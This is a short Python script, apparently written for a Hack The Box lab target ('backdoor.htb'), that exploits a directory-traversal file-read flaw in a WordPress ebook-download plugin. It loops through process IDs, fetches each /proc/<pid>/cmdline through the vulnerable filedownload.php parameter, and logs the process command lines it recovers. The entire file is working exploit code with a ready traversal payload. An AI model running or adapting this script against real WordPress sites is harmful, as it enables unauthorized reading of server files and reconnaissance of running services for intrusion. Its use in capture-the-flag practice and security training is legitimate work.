#!/usr/bin/python3
import requests
import re
import sys
#Change this url if needed
url = r'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='
#Change prefix if needed
prefix = r'../../../../../../../../../../..'
if len(sys.argv)==3:
	f = open(sys.argv[1],'w')
	scan_range = int(sys.argv[2])
else:
	f = False
	scan_range = 2000
for i in range(scan_range):
	file_path = '/proc/{}/cmdline'.format(i)
	lfi_payload = prefix + file_path ## change prefix if needed
	print(file_path, end='\r')
	r=requests.get(url+prefix+file_path)
	#Change regex if needed
	regexp = re.compile("{}{}{}(.*?)<script>window.close".format(lfi_payload,lfi_payload,lfi_payload),re.DOTALL)
	res = regexp.findall(r.text)
	if res[0].strip() != '':
		out = '{}:{}'.format(i,res[0])
		print(out)
		if f:
			f.write(out+'\n')
			f.flush()
if f:
	f.close()